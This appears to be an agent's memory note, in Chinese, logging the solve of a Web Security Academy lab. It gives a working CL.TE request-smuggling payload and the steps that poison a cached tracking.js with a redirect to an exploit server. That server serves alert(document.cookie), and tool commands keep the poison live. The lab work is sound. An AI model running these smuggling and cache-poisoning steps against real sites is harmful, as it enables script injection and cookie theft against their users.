---
metadata:
  node_type: memory
name: "lab-perform-web-cache-poisoning"
description: "A 臂实录:CL.TE 走私把 app 的 Host 派生 302 缓存成 tracking.js 条目,受害者浏览器跟随到 exploit server 执行 alert(document.cookie),banner is-solved"
last_updated: 2026-10-09T14:42:03+08:00
created: 2026-10-09T14:42:03+08:00
---

## 2026-10-09 A 臂实录(lab-perform-web-cache-poisoning)

实例 0a980082040c083680b18fb2000c00a4.web-security-academy.net;exploit server
exploit-0a1500af0452088380678e1f019f00b3.exploit-server.net(range_launch 报 exploit_server:null 但实例根页 header 里有 exploit-link 可读)。

- 前置指纹(实测,非假设):前端做 Host 路由——带 `Host: <exploit server>` 的请求由 Academy Exploit Server 应答;
  走私残留(前端看不见的那条请求)仍由 lab 应用应答,Host 头不改变其归属。
- 缓存面:`/resources/js/tracking.js` 带 `Cache-Control: max-age=30` + `X-Cache`/`Age`;键含 Host
  (Host=exploit 请求取回的内容不会污染 lab 键,故必须走私)。
- 失步确认:CL.TE。`conn_reuse --cl-te 'GET /404smug HTTP/1.1\r\nX-Ignore: X'` 单独发,再单独发一个 `GET /` → 该请求收到 404。
  跨客户端连接的后端连接复用成立(残留被下一次请求消费)。
- 关键原语(本靶场题眼):`GET /post/next?postId=N` 的 302 Location 是**用请求 Host 拼出的绝对 URL**:
  `Location: https://<Host>/post?postId=<N+1>`。走私请求带 `Host: exploit-...` 时,这条 302 就是"到 exploit server 的重定向"。
- 投毒两步(不可省):① 走私一条**未完成**请求 `GET /post/next?postId=1 HTTP/1.1\r\nHost: exploit-...\r\nContent-Length: 40\r\n\r\n`
  (头完整+空行+CL 大于实给字节,后端等 body);② 紧跟一条 `GET /resources/js/tracking.js`(lab Host,须为缓存 miss,
  即上一毒已过 30s 或尚未缓存)。②的字节被后端当成①的 body 吃掉,①的 302 随即生成,前端把它记到②的 URL 上并缓存
  (前端补 `Cache-Control: max-age=30`,`X-Cache: miss`→`hit`)。
- 载荷宿主:exploit server STORE `responseFile=/post`(查询串被忽略),Head `HTTP/1.1 200 OK\nContent-Type: application/javascript; charset=utf-8`,
  Body `alert(document.cookie);`。
- 判据:无需 DELIVER 按钮(本表无该按钮),模拟受害者浏览器自行浏览(实测约 28s 一次);exploit server 访问日志
  `GET /post?postId=2` UA `Mozilla/5.0 (Victim) ... Chrome/154` 连续命中 → alert 触发 → banner `is-solved`
  (`Congratulations, you solved the lab!`,exploit server /log 页头部同为 is-solved)。banner 比事件慢一拍,需复核。
- 保持毒活:`smuggle_arm <lab> --smuggle '<①>' --check <tracking.js URL> --marker exploit-<id> --rounds 30 --gap-ms 6000`
  后台跑 3 分钟(其 check 轮询既是判读也是触发;命中即报 marker)。
- 坑:exploit server 读访问日志的 POST 必须带 `responseFile`(否则 400),随后 302 到 `/log`,`GET /log` 直接看日志;
  带 responseFile/responseHead/responseBody 的 ACCESS_LOG POST 会按所填值重存,填同样的值即无害。
- 件面:conn_reuse(帧+字节级)、smuggle_arm(轮次编排)、banner_verdict、http_dump/http_session、nap。
